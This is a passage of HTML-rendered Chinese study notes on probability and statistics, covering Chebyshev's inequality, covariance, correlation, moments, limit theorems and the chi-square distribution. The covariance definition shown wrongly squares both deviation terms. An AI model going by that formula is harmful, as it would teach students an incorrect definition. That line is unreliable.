style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>或<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">{</mo><mi mathvariant="normal">∣</mi><mi>X</mi><mo>−</mo><mi>μ</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi>ε</mi><mo stretchy="false">}</mo><mo>≥</mo><mn>1</mn><mo>−</mo><mfrac><msup><mi>σ</mi><mn>2</mn></msup><msup><mi>ε</mi><mn>2</mn></msup></mfrac></mrow><annotation encoding="application/x-tex">P\{|X-\mu| \leq \varepsilon\}\geq1-\frac{\sigma^2}{\varepsilon^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">{</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">μ</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ε</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.36292em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01792em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">ε</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul></li><li>协方差<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Cov</mtext><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Cov}(X, Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Cov</span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>、相关系数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>ρ</mi><mrow><mi>X</mi><mi>Y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\rho_{XY}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><ul><li><strong>协方差</strong><ul><li><strong>定义式：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Cov</mtext><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">{</mo><mo stretchy="false">[</mo><mi>X</mi><mo>−</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">]</mo><mn>2</mn></msup><mo stretchy="false">[</mo><mi>Y</mi><mo>−</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">]</mo><mn>2</mn></msup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\text{Cov}(X,Y)=E\{[X-E(X)]^2[Y-E(Y)]^2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Cov</span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">{</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></li><li><strong>计算式：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>Cov</mtext><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Cov}(X,Y) = E(XY)-E(X)E(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">Cov</span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></li></ul></li><li><strong>相关系数</strong><ul><li>定义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>ρ</mi><mrow><mi>X</mi><mi>Y</mi></mrow></msub><mo>=</mo><mfrac><mrow><mtext>Cov</mtext><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><mrow><msqrt><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow></msqrt><msqrt><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\rho_{XY}=\frac{\text{Cov}(X,Y)}{\sqrt{D(X)}\sqrt{D(Y)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.8396em;vertical-align:-0.8295999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.4641625em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0369107142857144em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mclose mtight">)</span></span></span><span style="top:-3.0089107142857143em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width="400em" height="1.5428571428571431em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4196607142857143em;"><span></span></span></span></span></span><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0369107142857144em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span></span></span><span style="top:-3.0089107142857143em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width="400em" height="1.5428571428571431em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4196607142857143em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">Cov</span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8295999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>含义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mi mathvariant="normal">、</mi><mi>Y</mi></mrow><annotation encoding="application/x-tex">X、Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>相关程度 (<u>仅就线性关系来说</u>)</li></ul></li></ul></li><li>矩<ul><li>中心矩</li><li>原点矩</li></ul></li></ul><h2 id="大数定律和中心极限定理"><a class="markdownIt-Anchor" href="#大数定律和中心极限定理"></a> 大数定律和<strong>中心极限定理</strong></h2><ul><li>辛钦大数定律 --&gt; 伯努利大数定律</li><li><strong>独立同分布的中心极限定理</strong></li><li>李雅普诺夫<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext mathvariant="italic">(Lyapunov)</mtext></mrow><annotation encoding="application/x-tex">\textit{(Lyapunov)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord textit">(Lyapunov)</span></span></span></span></span>定理</li><li>棣莫弗-拉普拉斯<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext mathvariant="italic">(De</mtext><mtext> </mtext><mtext mathvariant="italic">Moivre-Laplace)</mtext></mrow><annotation encoding="application/x-tex">\textit{(De Moivre-Laplace)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord textit">(De Moivre-Laplace)</span></span></span></span></span>定理</li></ul><h2 id="样本及抽样分布"><a class="markdownIt-Anchor" href="#样本及抽样分布"></a> 样本及抽样分布</h2><ul><li><strong>统计学三大分布</strong><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi mathvariant="script">X</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\mathcal{X}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo>∼</mo><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{X}^2 \sim \mathcal{X}^2(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>服从总体<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">N(0,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> --&gt; 统计量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo>=</mo><msubsup><mi>X</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>X</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><mo>⋯</mo><mo>+</mo><msubsup><mi>X</mi><mi>n</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{X}^2=X_1^2+X_2^2+ \cdots +X_n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></li><li>可加性：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><msub><mi mathvariant="script">X</mi><mn mathvariant="script">1</mn></msub><mn>2</mn></msup><mo>+</mo><msup><msub><mi mathvariant="script">X</mi><mn mathvariant="script">2</mn></msub><mn>2</mn></msup><mo>∼</mo><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo>+</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{X_1}^2+\mathcal{X_2}^2 \sim \mathcal{X}^2(n_1+n_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0373379999999999em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.14643em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathcal mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.887338em;"><span style="top:-3.1362300000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0373379999999999em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.14643em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathcal mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.887338em;"><span style="top:-3.1362300000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 